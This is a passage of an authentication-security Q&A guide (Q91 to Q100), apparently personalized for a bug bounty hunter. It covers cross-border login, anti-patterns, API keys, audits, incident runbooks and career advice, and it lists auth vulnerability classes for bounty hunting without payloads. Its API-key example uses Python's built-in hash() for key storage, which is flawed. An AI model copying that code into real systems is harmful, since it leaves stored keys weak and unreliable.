- Force re-auth on anomaly
- Require MFA on risky logins
- Alert security team
- Auto-disable compromised accounts

### Q91: Authentication challenges in cross-border systems
**A:**

**Issues:**

**1. Data sovereignty:**
- GDPR (EU) - data must stay in EU
- China - data in China
- Russia - data localization
- India - DPDPA 2023

**2. Identity verification:**
- Different ID systems (SSN vs Aadhaar vs Personnummer)
- KYC requirements vary
- Different document standards

**3. Multi-language:**
- UI translations
- Cultural conventions
- Different name formats

**4. Regulations:**
- GDPR consent requirements
- US state laws (CCPA, others)
- Industry-specific (HIPAA, GLBA)

**5. SMS reliability:**
- Different telecom standards
- Spam filtering varies
- Some countries block international SMS

**6. Authentication factor availability:**
- SMS not reliable everywhere
- Biometrics legal issues some countries
- Hardware tokens shipping restrictions

**Implementation:**

```python
class CrossBorderAuth:
    def get_allowed_factors(self, user):
        country = user.country
        factors = ['password']
        
        if country in SMS_RELIABLE_COUNTRIES:
            factors.append('sms_otp')
        
        if country in BIOMETRIC_LEGAL_COUNTRIES:
            factors.append('biometric')
        
        # Authenticator apps work everywhere
        factors.append('totp')
        factors.append('webauthn')
        
        return factors
    
    def get_data_region(self, user):
        if user.country in EU_COUNTRIES:
            return 'eu-west-1'
        elif user.country == 'CN':
            return 'cn-north-1'
        elif user.country == 'RU':
            return 'ru-central-1'
        else:
            return 'us-east-1'
```

**Best practices:**
- Multiple factor options
- Regional data centers
- Localized UI
- Compliance documentation per region
- Legal review for each market

### Q92: Common authentication anti-patterns to avoid
**A:**

**1. "Security through obscurity"** - Hidden admin endpoints (`/admin-12345/`) still discoverable

**2. Hand-rolled crypto** - Custom hashing, encryption algorithms. Always use vetted libraries.

**3. Custom OAuth implementation** - OAuth has many edge cases. Use proven libraries.

**4. Bypass for "trusted" users** - "Admin doesn't need to provide MFA" leads to admin account takeover.

**5. Reusing session tokens as API keys** - Different concerns, different lifetimes.

**6. Stateless logout** - JWT can't be revoked without blocklist. Don't claim "logout" without invalidating.

**7. Trusting client-side validation** - Password strength check in JS only - server must validate too.

**8. Storing security questions in plain text** - Should be hashed like passwords.

**9. Email as recovery + auth** - Email compromise = total account takeover. Need additional factors.

**10. "Forgot password" reveals existence** - Same response always.

**11. Predictable user IDs** - Sequential IDs enable enumeration.

**12. Sharing authentication between dev and prod** - Compromised dev DB = prod compromise.

**13. Disabling MFA enforcement for "convenience"** - Defeats the purpose.

**14. Time-based lockouts only** - Should also check distinct factors.

**15. "Trust this device forever"** - Long-term tokens with no expiration.

### Q93: Authentication for API-only products
**A:**

**API-only product = No traditional login UI.**

**Common patterns:**

**1. API keys:**
- Generated in dashboard
- Long-lived
- Easy revocation
- Per-application scope

**2. OAuth Client Credentials:**
- Server-to-server
- Time-limited tokens
- Scope-based permissions

**3. JWT Bearer Tokens:**
- Self-contained
- Short-lived
- Often combined with refresh tokens

**4. API key + JWT hybrid:**
- Long-lived API key
- Used to generate short-lived JWTs
- JWTs for actual API calls

**Authentication flow:**
```python
# Customer dashboard
@app.route('/dashboard/api-keys', methods=['POST'])
@require_auth
def create_api_key():
    key = generate_api_key()
    APIKey.objects.create(
        customer=request.customer,
        key_hash=hash(key),
        scopes=request.form.getlist('scopes')
    )
    return {"key": key}  # Show once

# API calls
@app.route('/api/v1/data')
def get_data():
    api_key = request.headers.get('Authorization', '').replace('Bearer ', '')
    
    key_obj = APIKey.objects.filter(
        key_hash=hash(api_key),
        revoked_at__isnull=True
    ).first()
    
    if not key_obj:
        return 401
    
    # Update last used
    key_obj.last_used_at = datetime.now()
    key_obj.save()
    
    # Check scope
    if 'data:read' not in key_obj.scopes:
        return 403
    
    # Process
    return data_for_customer(key_obj.customer)
```

**Best practices:**
- IP allowlist option
- Rate limiting per key
- Audit logging
- Webhook signatures for callbacks
- Secret rotation guidance
- Test vs production keys
- Postman/SDK integration

### Q94: How to handle authentication when scaling globally
**A:**

**Considerations:**

**1. Geographic latency:**
- Auth endpoint near users
- Multi-region deployment
- Edge authentication

**2. Data residency:**
- GDPR, China, Russia requirements
- Separate auth stores per region
- Federation between regions

**3. Distributed sessions:**
- Session replication
- Or stateless tokens
- Or session in geo-distributed cache (Redis Cluster)

**4. Token validation:**
- Public keys distributed globally
- JWT validation at edge
- No central call needed

**5. Compliance per region:**
- Different password policies
- Different MFA requirements
- Different audit retention

**Architecture:**
```
[User EU] → [EU Edge] → [EU Auth] → [EU User Store]
                ↓ (Federation)
[User US] → [US Edge] → [US Auth] → [US User Store]
                ↓
[User APAC] → [APAC Edge] → [APAC Auth] → [APAC User Store]
```

**Performance optimizations:**
- Token validation at CDN/edge
- Cached authentication decisions
- Async audit log writing
- Read replicas for user lookups
- Write to nearest region, async replication

**Reliability:**
- Multi-AZ deployment
- Failover regions
- Graceful degradation
- Circuit breakers

### Q95: Future of authentication (post-passwords)
**A:**

**Where we're heading:**

**1. Passwordless mainstream:**
- Passkeys ubiquitous
- WebAuthn standard
- Biometric default

**2. Continuous authentication:**
- Always verifying
- Behavioral biometrics
- Risk-based prompts

**3. Decentralized identity:**
- User-owned credentials
- Verifiable credentials (W3C)
- Self-sovereign identity (SSI)

**4. Privacy-preserving:**
- Zero-knowledge proofs
- Minimal disclosure
- Selective attribute sharing

**5. Quantum-resistant:**
- NIST PQC algorithms
- New signature schemes
- Hybrid classical + post-quantum

**6. AI-powered:**
- Better anomaly detection
- Smarter risk scoring
- Adversarial AI threats too

**7. Hardware integration:**
- TPM 2.0 ubiquitous
- Secure enclaves
- Hardware-bound credentials

**8. Cross-platform standards:**
- FIDO Alliance progress
- Passkey sync standards
- Cross-vendor compatibility

**9. Regulatory pressure:**
- Privacy laws expanding
- Authentication requirements tightening
- Industry-specific mandates

**10. UX improvements:**
- One-tap authentication
- Context-aware prompts
- Frictionless when low risk

**Career advice:**
- Stay current with WebAuthn/FIDO
- Learn modern IAM platforms (Okta, Auth0, Azure AD)
- Understand cryptographic primitives
- Cloud-native authentication
- Identity governance
- Compliance frameworks

### Q96: Authentication for Bug bounty - how to find vulns
**A:**

**Focus areas:**

**1. OAuth flows:**
- State parameter validation
- Redirect URI validation
- Code reuse
- Token leakage in URLs

**2. Password reset:**
- Token predictability
- Token reuse
- Host header injection
- Race conditions

**3. Session management:**
- Session fixation
- Insecure cookies
- Long-lived sessions
- Cross-account access

**4. 2FA bypasses:**
- Skip 2FA step
- Backup code abuse
- Phone change bypass
- Race conditions

**5. SSO integration issues:**
- SAML signature validation
- Assertion replay
- JWT vulnerabilities

**6. Registration flaws:**
- Email verification bypass
- Username enumeration
- Mass assignment for role

**7. API authentication:**
- Token leakage
- IDOR
- BOLA
- Weak token generation

**Bug bounty payouts for auth issues:**
- Account takeover via OAuth: $5K-$20K
- 2FA bypass: $3K-$10K
- Password reset takeover: $2K-$15K
- Session fixation: $1K-$5K
- Auth bypass: $5K-$50K
- Sign-in linking attack: $5K-$15K

**Tips:**
1. Read OAuth/SSO documentation thoroughly
2. Look at recently disclosed reports for patterns
3. Test edge cases (race conditions, timing)
4. Combine multiple findings
5. Focus on high-impact (account takeover)
6. Document clearly with PoC

### Q97: Career tips for authentication specialist
**A:**

**Building expertise:**

**1. Foundational knowledge:**
- OWASP authentication guides
- NIST 800-63 standards
- OAuth/OIDC specifications
- SAML 2.0 specifications
- WebAuthn/FIDO2

**2. Hands-on practice:**
- PortSwigger Academy auth labs
- HackTheBox auth challenges
- Real bug bounty programs
- Build vulnerable apps and fix them

**3. Tool mastery:**
- Burp Suite for auth testing
- JWT.io for token analysis
- SAML tester tools
- OAuth playgrounds

**4. Certifications:**
- OSCP (broad)
- OSWE (web focus, includes auth)
- CISSP (theory)
- Cloud certs (AWS, Azure SC-300)

**5. Specialize:**
- IAM specialist
- Identity threat detection
- Compliance auditor (SOC 2, HIPAA)
- IDaaS architect (Okta, Auth0)

**6. Build portfolio:**
- Bug bounty findings (auth-focused)
- Blog posts
- Conference talks
- Open source tools

**7. Network:**
- IAM Twitter community
- Security conferences (Identiverse, RSA, BSides)
- Local meetups
- Discord/Slack groups

**Career paths:**
- IAM Engineer
- Security Engineer (auth focus)
- IAM Architect
- IDaaS Consultant
- Identity Auditor
- Bug Bounty Hunter (auth specialty)

**Salary expectations (2026, India context):**
- Junior IAM: ₹5-10 LPA
- Mid IAM: ₹10-20 LPA
- Senior IAM Architect: ₹25-50 LPA
- Principal Identity Engineer: ₹50L+

**For Jagdeep specifically:**
Your CRTP + bug bounty + Zorvyn FinTech background positions you well. Authentication expertise in fintech is highly valued. Consider adding:
- Banking-specific auth (3D Secure, FIDO for payments)
- Indian compliance (RBI guidelines, Aadhaar integration)
- Open banking authentication

### Q98: Authentication compliance audit preparation
**A:**

**SOC 2 Type 2 audit prep (authentication scope):**

**Documentation needed:**

1. **Policies:**
- Password policy
- MFA policy
- Access control policy
- Account management policy
- Authentication monitoring policy

2. **Procedures:**
- User provisioning/deprovisioning
- Password reset procedures
- Access review procedures
- Incident response procedures

3. **Evidence collection:**
- Sample authentication logs
- Access reviews (quarterly)
- Failed login monitoring
- MFA enrollment records

**Common audit findings:**

1. Inactive accounts not disabled
2. Excessive admin privileges
3. Missing MFA on privileged accounts
4. Shared accounts in use
5. No password complexity enforcement
6. Audit logs insufficient retention
7. No regular access reviews

**Pre-audit checklist:**

- [ ] All policies reviewed in last year
- [ ] All employees signed acceptable use
- [ ] MFA enabled for all employees
- [ ] All privileged accounts MFA
- [ ] Access reviews completed (last quarter)
- [ ] Terminated employee accounts disabled (within X days)
- [ ] Service accounts documented and reviewed
- [ ] Audit logs retained per policy
- [ ] Authentication monitoring active
- [ ] Incident response tested
- [ ] Security training completed
- [ ] Vendor access reviewed

**Audit response:**

1. Provide requested evidence promptly
2. Be honest about gaps
3. Show remediation plans for findings
4. Demonstrate continuous improvement
5. Document compensating controls

### Q99: Authentication runbook for incidents
**A:**

**Incident: Suspected account takeover**

```
SEVERITY: HIGH
RESPONSE TIME: 15 minutes

STEP 1: Verify incident (5 min)
- Check for suspicious activity logs
- Confirm user reports
- Check IP reputation
- Review session activity

STEP 2: Contain (10 min)
- Force logout all sessions for user
- Disable account temporarily
- Invalidate all tokens
- Block IPs if suspicious

STEP 3: Investigate (1 hour)
- Review login history (30 days)
- Check actions taken
- Identify data accessed
- Determine attack vector

STEP 4: Notify (2 hours)
- Contact user via verified channel
- Inform security team
- Document timeline

STEP 5: Recover (4 hours)
- Force password reset
- Force MFA enablement
- Help user re-secure account
- Re-enable account

STEP 6: Post-incident (24 hours)
- Root cause analysis
- Lessons learned
- Process improvements
- Compliance reporting if required

COMMUNICATION TEMPLATES:
- User notification email
- Internal incident report
- Executive summary
- Customer disclosure (if needed)
```

**Incident: Mass credential stuffing detected**

```
STEP 1: Detect indicators
- High failed login rate
- Distributed IPs
- Common patterns
- Bot characteristics

STEP 2: Activate defenses
- Enable enhanced CAPTCHA
- Lower rate limits
- Increase risk scoring
- Block bad IP ranges

STEP 3: Identify compromised accounts
- Successful logins from suspicious sources
- Account behavior changes
- Reset affected accounts

STEP 4: User notification
- Email warning to all users
- Force password resets if breached
- Suggest 2FA enrollment

STEP 5: Long-term mitigation
- Adopt HaveIBeenPwned API
- Stronger bot detection (DataDome)
- WAF tuning
- Customer education
```

### Q100: Final thoughts on authentication mastery
**A:**

**Progression for authentication expertise:**

**Beginner (0-1 year):**
- Understand basic auth concepts
- Implement simple login flows
- Use frameworks correctly
- Test basic vulnerabilities

**Intermediate (1-3 years):**
- Implement OAuth/OIDC
- Handle session management properly
- Find auth bugs in production
- Conduct auth pentests
- Bug bounty success on auth

**Advanced (3-5 years):**
- Design auth systems
- Implement SSO/SAML
- Build adaptive authentication
- Lead security architecture
- Compliance expertise

**Expert (5+ years):**
- Architect identity platforms
- Lead IAM initiatives
- Develop industry standards
- Mentor and educate
- Speak at conferences

**Authentication is foundational:**

Almost every security incident involves authentication failures:
- Credentials leaked → breach
- MFA bypassed → account takeover
- Sessions hijacked → data theft
- Tokens compromised → API abuse

Mastery of authentication = high-value security skill.

**Final advice:**

1. **Always defense in depth** - Multiple layers
2. **User experience matters** - Friction = workarounds
3. **Stay current** - Standards evolve rapidly
4. **Practice with real systems** - Bug bounties, CTFs
5. **Build, then break, then fix** - Hands-on understanding
6. **Document everything** - Auth is auditable
7. **Plan for compromise** - It will happen
8. **Educate users** - They're part of the system
9. **Measure metrics** - Detect anomalies
10. **Compliance is baseline** - Security must exceed

For your career path (Encrypticle + Zorvyn FinTech + bug bounty):

Authentication expertise in fintech is gold. Banking/payments are heavily regulated and authentication-intensive. Your CRTP background means you understand attacker perspective. Combine offensive knowledge with defensive architecture skills = unique value.

Build content around authentication for Encrypticle - it's a perennial topic with high search volume. Your bug bounty findings in authentication will resonate with Indian audience.

The PepsiCo finding showed business logic vulnerability (related to authentication context). JBL subdomain auth bypass is classic auth flow flaw. These are your portfolio - leverage them.

Continue depth in:
- Banking authentication (3D Secure 2, EMV)
- Indian-specific (Aadhaar, UPI, RBI guidelines)
- Cloud authentication (AWS Cognito, Azure AD)
- Modern passwordless (FIDO2, passkeys)

You're well-positioned. Authentication knowledge will serve your entire career.

---

## END OF PART 4 - AUTHENTICATION & SESSIONS (100 Q&A COMPLETE)